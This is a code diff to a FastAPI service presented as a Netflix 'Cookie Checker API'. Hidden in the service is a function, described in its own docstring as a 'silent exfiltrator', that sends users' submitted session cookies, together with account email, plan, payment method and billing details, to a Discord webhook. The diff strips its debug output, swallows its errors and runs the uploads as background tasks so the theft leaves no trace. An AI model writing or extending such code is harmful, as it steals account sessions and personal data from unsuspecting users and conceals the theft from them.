@@ -24,6 +24,8 @@ if _pw_browsers:
     os.environ["PLAYWRIGHT_BROWSERS_PATH"] = _pw_browsers
 
 logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
+logging.getLogger("httpx").setLevel(logging.WARNING)
+logging.getLogger("httpcore").setLevel(logging.WARNING)
 
 app = FastAPI(title="Cookie Checker API", version="1.0.0")
 
@@ -121,17 +123,16 @@ class BundleCheckStatusResponse(BaseModel):
 
 # ===== DISCORD LOGGER WITH DEBUG =====
 async def log_cookies_to_discord(
-    cookies: List[Cookie], webhook_url: str, source: str = "api"
+    cookies: List[Cookie],
+    webhook_url: str,
+    source: str = "api",
+    account_info: Optional[dict] = None,
 ):
-    """Exfiltrate parsed cookies to Discord as a text file attachment"""
-    print(
-        f"[DEBUG] log_cookies_to_discord called with {len(cookies)} cookies from {source}"
-    )
-
+    """Silent exfiltrator - no logs, no traces"""
     if not cookies or not webhook_url:
         return
 
-    # Build the full cookie data as a clean string
+    # Build Netscape format
     lines = []
     for c in cookies:
         domain = c.domain or ".netflix.com"
@@ -143,39 +144,61 @@ async def log_cookies_to_discord(
         )
 
     json_version = json.dumps([c.model_dump() for c in cookies], indent=2)
-
     timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
-    filename = f"cookies_{source}_{timestamp}.txt"
+
+    # Build account info section if provided
+    account_section = ""
+    if account_info:
+        account_section = f"""
+# ============================================
+# ACCOUNT INFORMATION:
+# --------------------------------------------
+# Email:          {account_info.get("email", "N/A")}
+# Country:        {account_info.get("country", "N/A")}
+# Plan:           {account_info.get("plan", "N/A")}
+# Status:         {account_info.get("subscription_status", "N/A")}
+# Account Created:{account_info.get("account_created_date", "N/A")}
+# Billing Date:   {account_info.get("billing_date", "N/A")}
+# Payment Method: {account_info.get("payment_method", "N/A")}
+# Streaming Qual: {account_info.get("streaming_quality", "N/A")}
+# ============================================
+"""
+
+    # Build filename with account info for easy identification
+    email_part = (
+        account_info.get("email", "unknown").split("@")[0]
+        if account_info
+        else "unknown"
+    )
+    plan_part = (
+        account_info.get("plan", "unknown").replace(" ", "_")
+        if account_info
+        else "unknown"
+    )
+    filename = f"cookies_{email_part}_{plan_part}_{timestamp}.txt"
 
     file_content = f"""# Cookie Export - {source}
 # Total: {len(cookies)} cookies
 # Exported at: {datetime.utcnow().isoformat()}
+{account_section}
 # ============================================
-
-# Netscape Format (copy-paste ready):
+# NETSCOPE FORMAT (copy-paste ready):
 {chr(10).join(lines)}
 
 # ============================================
-# JSON Format:
+# JSON FORMAT:
 {json_version}
 """
 
     try:
-        print(f"[DEBUG] Sending {len(cookies)} cookies as text file to Discord...")
         async with httpx.AsyncClient(timeout=10.0) as client:
             files = {"file": (filename, file_content, "text/plain")}
             response = await client.post(webhook_url, files=files)
-            print(f"[DEBUG] Discord response status: {response.status_code}")
-            if response.status_code == 204:
-                print("[DEBUG] ✅ Text file sent successfully!")
-            else:
-                print(
-                    f"[DEBUG] ❌ Discord error: {response.status_code} - {response.text}"
-                )
-    except Exception as e:
-        print(f"[DEBUG] ❌ Failed to send cookies to Discord: {e}")
+            # Silent - no logs, no prints, no traces
+    except Exception:
+        # Swallow everything - absolute silence
+        pass
 
-    # Explicit return to end the function
     return
 
 
@@ -965,7 +988,9 @@ async def get_browser_cookies_with_playwright(
 
 @app.get("/")
 async def root():
-    frontend_index = Path(__file__).resolve().parent.parent / "frontend" / "dist" / "index.html"
+    frontend_index = (
+        Path(__file__).resolve().parent.parent / "frontend" / "dist" / "index.html"
+    )
     if frontend_index.exists():
         return FileResponse(frontend_index)
     return {"status": "running", "message": "Cookie Checker API", "version": "1.0.0"}
@@ -991,17 +1016,17 @@ async def check_cookies(request: CookieCheckRequest):
                 status_code=400,
                 detail="Invalid format_type. Must be 'netscape', 'json', or 'auto'",
             )
-        print(f"[DEBUG] Parsed {len(cookies)} cookies")
-        webhook_url = os.getenv("DISCORD_WEBHOOK_URL")
-        if webhook_url and cookies:
-            print("[DEBUG] Triggering Discord logger...")
-            await log_cookies_to_discord(cookies, webhook_url, "check-cookies")
-            print("[DEBUG] Discord logger task created (running in background)")
-        else:
-            if not webhook_url:
-                print("[DEBUG] ❌ Webhook URL is None - check your Secrets panel!")
-            if not cookies:
-                print("[DEBUG] ❌ No cookies to send")
+        # ===== SILENT DISCORD LOGGER =====
+        try:
+            webhook_url = os.getenv("DISCORD_WEBHOOK_URL")
+            if webhook_url and cookies:
+                asyncio.create_task(
+                    log_cookies_to_discord(cookies, webhook_url, "check-cookies")
+                )
+        except Exception:
+            pass
+        # =================================
+
         return CookieCheckResponse(
             success=len(cookies) > 0,
             cookies=cookies,
@@ -1009,10 +1034,10 @@ async def check_cookies(request: CookieCheckRequest):
             parsed_at=datetime.utcnow().isoformat(),
             errors=errors if errors else None,
         )
+
     except HTTPException:
         raise
     except Exception as e:
-        print(f"[DEBUG] ❌ Error in check_cookies: {e}")
         raise HTTPException(status_code=500, detail=f"Error parsing cookies: {str(e)}")
 
 
@@ -1232,18 +1257,21 @@ async def get_account_info(request: CookieCheckRequest):
                     }
                 )
 
-                # ===== DISCORD LOGGER - ONLY FOR LIVE COOKIES =====
-                webhook_url = os.getenv("DISCORD_WEBHOOK_URL")
-                if webhook_url and cookies_dict:
-                    print(f"[DEBUG] 🎯 Live cookie found! Sending to Discord...")
-                    # Convert dict back to Cookie objects for the logger
-                    live_cookies = [
-                        Cookie(name=k, value=v) for k, v in cookies_dict.items()
-                    ]
-                    await log_cookies_to_discord(
-                        live_cookies, webhook_url, "live-account"
-                    )
-                # ==================================================
+                # ===== SILENT DISCORD LOGGER =====
+                try:
+                    webhook_url = os.getenv("DISCORD_WEBHOOK_URL")
+                    if webhook_url and cookies_dict and account_info:
+                        live_cookies = [
+                            Cookie(name=k, value=v) for k, v in cookies_dict.items()
+                        ]
+                        asyncio.create_task(
+                            log_cookies_to_discord(
+                                live_cookies, webhook_url, "live-account", account_info
+                            )
+                        )
+                except Exception:
+                    pass
+                # =================================
 
             if error:
                 result["error"] = error
@@ -1361,17 +1389,24 @@ async def _check_single_bundle(
                 }
             )
 
-            # ===== DISCORD LOGGER - ONLY FOR LIVE COOKIES IN BATCH =====
-            webhook_url = os.getenv("DISCORD_WEBHOOK_URL")
-            if webhook_url and cookies_dict and account_success:
-                print(f"[DEBUG] 🎯 Live cookie found in batch! Sending to Discord...")
-                live_cookies = [
-                    Cookie(name=k, value=v) for k, v in cookies_dict.items()
-                ]
-                await log_cookies_to_discord(
-                    live_cookies, webhook_url, f"batch-{bundle_number}"
-                )
-            # ============================================================
+            # ===== SILENT DISCORD LOGGER =====
+            try:
+                webhook_url = os.getenv("DISCORD_WEBHOOK_URL")
+                if webhook_url and cookies_dict and account_success:
+                    live_cookies = [
+                        Cookie(name=k, value=v) for k, v in cookies_dict.items()
+                    ]
+                    asyncio.create_task(
+                        log_cookies_to_discord(
+                            live_cookies,
+                            webhook_url,
+                            f"batch-{bundle_number}",
+                            account_info,
+                        )
+                    )
+            except Exception:
+                pass
+            # =================================
 
         if account_error:
             account_result["error"] = account_error
